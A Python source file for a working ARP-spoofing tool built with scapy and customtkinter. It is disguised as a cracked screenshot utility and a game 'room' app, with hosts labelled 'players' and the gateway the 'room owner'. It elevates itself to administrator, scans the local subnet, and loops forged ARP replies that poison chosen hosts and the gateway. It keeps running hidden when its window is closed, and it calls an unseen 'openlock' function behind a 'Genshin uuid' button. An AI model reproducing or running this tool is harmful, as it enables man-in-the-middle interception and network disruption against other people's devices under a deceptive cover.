import sys
import threading
import time
from tkinter import messagebox

import customtkinter as ctk
from scapy.all import ARP, Ether, srp, sendp, conf, get_if_addr, get_if_list, get_if_hwaddr
import ctypes.wintypes
import subprocess


ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

def run_as_admin():
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False

    if not is_admin:
        script = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        sys.exit(0)

class ProSpooferV3(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("截图工具2016pro破解版")
        self.geometry("590x500")

        self.is_running = False
        self.selected_targets = {}
        self.all_scanned_devices = {}
        self.gateway_mac = None
        self.local_ip = "127.0.0.1"
        self.gateway_ip = None

        self.available_ifaces = self._get_available_ifaces()
        best_name, best_ip, best_mac = self._auto_select_best_iface()
        self.current_iface = best_name
        self.local_ip = best_ip

        self.setup_ui()
        self.auto_detect_gateway()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def _get_available_ifaces(self):
        ifaces = []
        try:
            raw_list = get_if_list()
            for name in raw_list:
                try:
                    ip = get_if_addr(name)
                    mac = get_if_hwaddr(name)
                    if ip and ip != "0.0.0.0" and mac:
                        ifaces.append((name, ip, mac, ip.startswith("127.")))
                except:
                    pass
        except:
            pass

        if not ifaces:
            try:
                name = str(conf.iface)
                ip = get_if_addr(conf.iface)
                mac = get_if_hwaddr(conf.iface)
                ifaces.append((name, ip, mac, ip.startswith("127.")))
            except:
                ifaces.append((str(conf.iface), "0.0.0.0", "00:00:00:00:00:00", False))
        return ifaces

    def _auto_select_best_iface(self):
        best = None
        best_score = -1

        for name, ip, mac, is_loop in self.available_ifaces:
            score = 0
            if not is_loop:
                score += 10
            if ip and ip != "0.0.0.0" and not ip.startswith("169.254"):
                score += 5
            try:
                route = conf.route.route("0.0.0.0")
                if route and len(route) > 2:
                    if str(route[0]) == name:
                        score += 20
            except:
                pass
            if score > best_score:
                best_score = score
                best = (name, ip, mac)

        if best:
            return best
        for name, ip, mac, is_loop in self.available_ifaces:
            if not is_loop:
                return (name, ip, mac)
        if self.available_ifaces:
            n, i, m, _ = self.available_ifaces[0]
            return (n, i, m)
        return (str(conf.iface), "0.0.0.0", "00:00:00:00:00:00")

    def repair_own_arp(self, gw_ip, gw_mac):
        mac_formatted = gw_mac.replace(":", "-").upper()
        subprocess.run(["arp", "-s", gw_ip, mac_formatted], capture_output=True)

    def auto_detect_gateway(self):
        try:
            gw = conf.route.route("0.0.0.0")[2]
            if gw and gw != "0.0.0.0":
                self.gateway_ip = gw
                self.gateway_entry.delete(0, "end")
                self.gateway_entry.insert(0, gw)
        except:
            pass

    def setup_ui(self):
        self.geometry("480x460")
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.sidebar = ctk.CTkFrame(self, width=180, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew", padx=2, pady=2)

        ctk.CTkLabel(self.sidebar, text="⚙️ 房间设置", font=("Arial", 14, "bold")).pack(pady=(15, 10))

        self.iface_label = ctk.CTkLabel(self.sidebar, text=f"🚪 房间ID: {self.local_ip}",
                                        font=("Arial", 12, "bold"), text_color="#2ecc71")
        self.iface_label.pack(pady=(5, 2))

        input_padx = 12
        ctk.CTkLabel(self.sidebar, text="房主:", font=("Arial", 11)).pack(anchor="w", padx=input_padx)
        self.gateway_entry = ctk.CTkEntry(self.sidebar, height=24, font=("Arial", 11))
        self.gateway_entry.pack(fill="x", padx=input_padx, pady=(2, 8))

        ctk.CTkLabel(self.sidebar, text="vip用户:", font=("Arial", 11)).pack(anchor="w", padx=input_padx)
        self.whitelist_entry = ctk.CTkEntry(self.sidebar, placeholder_text=" 在这里输入vip账户", height=24,
                                            font=("Arial", 11))
        self.whitelist_entry.pack(fill="x", padx=input_padx, pady=(2, 8))

        self.bidirectional_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(self.sidebar, text="游客登陆", variable=self.bidirectional_var,
                        checkbox_width=16, checkbox_height=16, font=("Arial", 11)).pack(
                            padx=input_padx, pady=5, anchor="w")

        # 发包间隔输入框
        interval_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        interval_frame.pack(fill="x", padx=input_padx, pady=(8, 2))
        ctk.CTkLabel(interval_frame, text="发包间隔(秒):", font=("Arial", 11)).pack(side="left")
        self.interval_entry = ctk.CTkEntry(interval_frame, width=50, height=22, font=("Arial", 11))
        self.interval_entry.pack(side="right")
        self.interval_entry.insert(0, "2")
        self.interval_entry.bind("<KeyRelease>", self._validate_interval)

        self.scan_btn = ctk.CTkButton(self.sidebar, text="🔍 寻找玩家", height=30, font=("Arial", 12, "bold"),
                                      command=self.start_scan)
        self.scan_btn.pack(fill="x", padx=input_padx, pady=10)

        self.attack_btn = ctk.CTkButton(self.sidebar, text="🚪 开启房间", height=30, font=("Arial", 12, "bold"),
                                        fg_color="#27ae60", hover_color="#219150", command=self.toggle_attack)
        self.attack_btn.pack(fill="x", padx=input_padx, pady=5)

        from ArpIP import openlock
        self.tool_btn = ctk.CTkButton(self.sidebar, text="✧原神uuid绑定", height=30, font=("Arial", 12, "bold"),
                                      fg_color="#27ae60", hover_color="#219150", command=openlock)
        self.tool_btn.pack(fill="x", padx=input_padx, pady=5)

        self.status_label = ctk.CTkLabel(self.sidebar, text="已准备好", font=("Arial", 10), text_color="gray")
        self.status_label.pack(side="bottom", pady=10)

        self.main_view = ctk.CTkFrame(self)
        self.main_view.grid(row=0, column=1, sticky="nsew", padx=5, pady=5)

        self.toolbar = ctk.CTkFrame(self.main_view, fg_color="transparent")
        self.toolbar.pack(fill="x", padx=5, pady=5)

        btn_style = {"width": 60, "height": 22, "font": ("Arial", 11), "fg_color": "#444"}
        ctk.CTkButton(self.toolbar, text="全部玩家", command=self.select_all, **btn_style).pack(side="left", padx=2)
        ctk.CTkButton(self.toolbar, text="其余玩家", command=self.invert_selection, **btn_style).pack(side="left", padx=2)
        ctk.CTkButton(self.toolbar, text="没有玩家", command=self.deselect_all, **btn_style).pack(side="left", padx=2)

        self.scroll_frame = ctk.CTkScrollableFrame(self.main_view, label_text="玩家列表 (双击复选框添加vip)",
                                                   label_font=("Arial", 11, "bold"))
        self.scroll_frame.pack(fill="both", expand=True, padx=2, pady=2)

    def _validate_interval(self, event=None):
        val = self.interval_entry.get()
        filtered = "".join(c for c in val if c.isdigit() or c == ".")
        if filtered != val:
            self.interval_entry.delete(0, "end")
            self.interval_entry.insert(0, filtered)
        if filtered.startswith("0") and len(filtered) > 1 and not filtered.startswith("0."):
            self.interval_entry.delete(0, "end")
            self.interval_entry.insert(0, filtered[1:])

    # --- 批量勾选逻辑 ---

    def select_all(self):
        for mac, (cb, var, ip) in self.selected_targets.items():
            if cb.cget("state") == "normal":
                var.set(True)

    def deselect_all(self):
        for mac, (cb, var, ip) in self.selected_targets.items():
            var.set(False)

    def invert_selection(self):
        for mac, (cb, var, ip) in self.selected_targets.items():
            if cb.cget("state") == "normal":
                var.set(not var.get())

    # --- 扫描逻辑 ---

    def start_scan(self):
        self.scan_btn.configure(state="disabled", text="查找中...")
        threading.Thread(target=self.do_scan, daemon=True).start()

    def _toggle_whitelist_ui(self, ip):
        wl_ips = [i.strip() for i in self.whitelist_entry.get().split(",") if i.strip()]
        if ip in wl_ips:
            self.remove_from_whitelist_ui(ip)
        else:
            self.add_to_whitelist_ui(ip)

    def add_to_whitelist_ui(self, ip):
        current = self.whitelist_entry.get().strip()
        if not current:
            self.whitelist_entry.insert(0, ip)
        elif ip not in [i.strip() for i in current.split(",")]:
            self.whitelist_entry.insert("end", f", {ip}")

        for mac, (cb, var, cur_ip) in list(self.selected_targets.items()):
            if cur_ip == ip:
                var.set(False)
                cb.configure(state="disabled", text_color="#555555")
                del self.selected_targets[mac]
                break

        self.status_label.configure(text=f"玩家 {ip} 已充值vip", text_color="#e67e22")

    def remove_from_whitelist_ui(self, ip):
        current = [i.strip() for i in self.whitelist_entry.get().split(",") if i.strip()]
        if ip in current:
            current.remove(ip)
        self.whitelist_entry.delete(0, "end")
        self.whitelist_entry.insert(0, ", ".join(current))

        for mac, (cb, var, cur_ip) in self.all_scanned_devices.items():
            if cur_ip == ip:
                cb.configure(state="normal", text_color="white")
                var.set(False)
                cb.unbind("<Double-Button-1>")
                cb.bind("<Double-Button-1>", lambda e, x=ip: self._toggle_whitelist_ui(x))
                self.selected_targets[mac] = (cb, var, ip)
                break

        self.status_label.configure(text=f"玩家 {ip} 已移出VIP", text_color="#e67e22")

    def _prepare_scan_params(self):
        gw_ip = self.gateway_entry.get().strip()
        iface = self.current_iface

        if not gw_ip or gw_ip == "0.0.0.0":
            if self.local_ip and self.local_ip != "127.0.0.1":
                network = ".".join(self.local_ip.split('.')[:-1]) + ".0/24"
                gw_ip = ".".join(self.local_ip.split('.')[:-1]) + ".1"
            else:
                return None
        else:
            network = ".".join(gw_ip.split('.')[:-1]) + ".0/24"

        wl_ips = [i.strip() for i in self.whitelist_entry.get().replace(" ", "").split(",") if i]
        wl_ips.append(gw_ip)
        wl_ips.append(self.local_ip)
        return (gw_ip, network, wl_ips, iface)

    def do_scan(self):
        params = self._prepare_scan_params()
        if params is None:
            messagebox.showerror("扫描失败", "无法检测到网关 IP，请手动填写")
            self.scan_btn.configure(state="normal", text="🔍 寻找玩家")
            return
        gw_ip, network, wl_ips, iface = params

        previously_checked = set()
        for mac, (cb, var, ip) in self.selected_targets.items():
            if var.get():
                previously_checked.add(mac)

        def scan_network():
            try:
                self.after(0, lambda: self._ui_pre_scan(gw_ip, network))
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
                             timeout=2, iface=iface, verbose=False, retry=1)

                if len(ans) == 0 and self.local_ip != "127.0.0.1":
                    alt_network = ".".join(self.local_ip.split('.')[:-1]) + ".0/24"
                    if alt_network != network:
                        self.after(0, lambda: self.status_label.configure(
                            text=f"尝试备用网段 {alt_network} ...", text_color="#f39c12"))
                        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=alt_network),
                                     timeout=2, iface=iface, verbose=False, retry=1)

                gw_mac = None
                for _, rcv in ans:
                    if rcv.psrc == gw_ip:
                        gw_mac = rcv.hwsrc
                        break

                if not gw_mac:
                    ans_gw, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
                                    timeout=2, iface=iface, verbose=False, retry=1)
                    gw_mac = ans_gw[0][1].hwsrc if ans_gw else None

                self.gateway_mac = gw_mac
                self.gateway_ip = gw_ip

                results = []
                found_ips = set()
                for _, rcv in ans:
                    ip, mac = rcv.psrc, rcv.hwsrc
                    if ip in found_ips:
                        continue
                    found_ips.add(ip)
                    results.append((ip, mac))
                self.after(0, lambda: self._ui_post_scan(results, gw_ip, wl_ips, previously_checked))
            except Exception as e:
                self.after(0, lambda: messagebox.showerror("扫描失败", f"请检查 Npcap 是否正常运行: {e}"))
            finally:
                self.after(0, lambda: self.scan_btn.configure(state="normal", text="🔍 寻找玩家"))

        threading.Thread(target=scan_network, daemon=True).start()

    def _ui_pre_scan(self, gw_ip, network):
        self.gateway_entry.delete(0, "end")
        self.gateway_entry.insert(0, gw_ip)
        for widget in self.scroll_frame.winfo_children():
            try:
                widget.destroy()
            except Exception:
                pass
        self.selected_targets = {}
        self.all_scanned_devices = {}
        self.status_label.configure(text=f"正在扫描 {network} ...", text_color="#f39c12")

    def _ui_post_scan(self, results, gw_ip, wl_ips, previously_checked):
        if self.gateway_mac:
            self.status_label.configure(text=f"网关已识别: {gw_ip} -> {self.gateway_mac}", text_color="#2ecc71")
        else:
            self.status_label.configure(text="网关未响应", text_color="#e67e22")

        for ip, mac in results:
            is_safe = ip in wl_ips or (self.gateway_mac and mac == self.gateway_mac) or ip == self.local_ip
            was_checked = mac in previously_checked and not is_safe

            var = ctk.BooleanVar(value=was_checked)
            state = "normal" if not is_safe else "disabled"

            if ip == self.local_ip:
                t_color = "#e67e22"
                display_text = f"{ip.ljust(15)} | {mac.upper()} (管理)"
            elif ip == gw_ip:
                t_color = "#3498db"
                display_text = f"{ip.ljust(15)} | {mac.upper()} (房主)"
            else:
                t_color = "white" if not is_safe else "#555555"
                display_text = f"{ip.ljust(15)} | {mac.upper()}"

            cb = ctk.CTkCheckBox(self.scroll_frame, text=display_text,
                                 variable=var, state=state, text_color=t_color)
            cb.pack(fill="x", pady=2)

            cb.unbind("<Double-Button-1>")
            cb.bind("<Double-Button-1>", lambda e, x=ip: self._toggle_whitelist_ui(x))
            self.all_scanned_devices[mac] = (cb, var, ip)
            if not is_safe:
                self.selected_targets[mac] = (cb, var, ip)

        total = len(self.selected_targets)
        restored = sum(1 for mac in previously_checked if mac in self.selected_targets)
        self.status_label.configure(text=f"扫描完毕: 发现 {total} 个玩家 ( {restored} )", text_color="#3498db")

    def _refresh_target_ips(self, target_macs):
        if not target_macs:
            return {}
        network = ".".join(self.local_ip.split('.')[:-1]) + ".0/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
                     timeout=1, iface=self.current_iface, verbose=False, retry=0)
        result = {}
        for _, rcv in ans:
            if rcv.hwsrc in target_macs:
                result[rcv.hwsrc] = rcv.psrc
        return result

    # --- 攻击逻辑 ---

    def toggle_attack(self):
        if not self.is_running:
            gw_ip = self.gateway_entry.get().strip()
            if not self.gateway_mac:
                messagebox.showwarning("提示", "请先扫描以获取网关 MAC")
                return
            selected = [(mac, info[2]) for mac, info in self.selected_targets.items() if info[1].get()]
            if not selected:
                messagebox.showwarning("提示", "未勾选玩家")
                return

            self.is_running = True
            self.attack_btn.configure(text="❎ 关闭房间", fg_color="#c0392b")
            threading.Thread(target=self.attack_loop, args=(selected, gw_ip), daemon=True).start()
        else:
            self.is_running = False
            self.attack_btn.configure(text="🚪 开启房间", fg_color="#27ae60")

    def attack_loop(self, targets, gw_ip):
        iface = self.current_iface
        do_bi = self.bidirectional_var.get()
        count = 0
        loop = 0

        mac_to_ip = {mac: ip for mac, ip in targets}

        while self.is_running:
            try:
                if loop % 5 == 0:
                    refreshed = self._refresh_target_ips(set(mac_to_ip.keys()))
                    for mac, new_ip in refreshed.items():
                        if new_ip != mac_to_ip.get(mac):
                            old_ip = mac_to_ip[mac]
                            self.status_label.configure(
                                text=f"目标 {old_ip} → {new_ip} (MAC追踪)", text_color="#f39c12")
                            mac_to_ip[mac] = new_ip

                for mac, current_ip in mac_to_ip.items():
                    p1 = Ether(dst=mac) / ARP(op=2, pdst=current_ip, hwdst=mac, psrc=gw_ip)
                    sendp(p1, iface=iface, verbose=False)

                    if do_bi and self.gateway_mac:
                        p2 = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=gw_ip, hwdst=self.gateway_mac,
                                                                psrc=current_ip)
                        sendp(p2, iface=iface, verbose=False)

                    count += (2 if do_bi else 1)

                self.status_label.configure(text=f"房间已开启，累计掉落物: {count}", text_color="#2ecc71")
                loop += 1
                if loop % 5 == 0 and self.gateway_mac:
                    self.repair_own_arp(gw_ip, self.gateway_mac)
                try:
                    interval = float(self.interval_entry.get())
                    if interval < 0.1:
                        interval = 0.1
                except ValueError:
                    interval = 2.0
                time.sleep(interval)
            except Exception as e:
                print(f"房间中断: {e}")
                break

        self.status_label.configure(text="状态: 已暂停", text_color="gray")

    def on_closing(self):
        if self.is_running:
            self.withdraw()
        else:
            self.destroy()
            sys.exit()

if __name__ == "__main__":
    run_as_admin()
    app = ProSpooferV3()
    app.mainloop()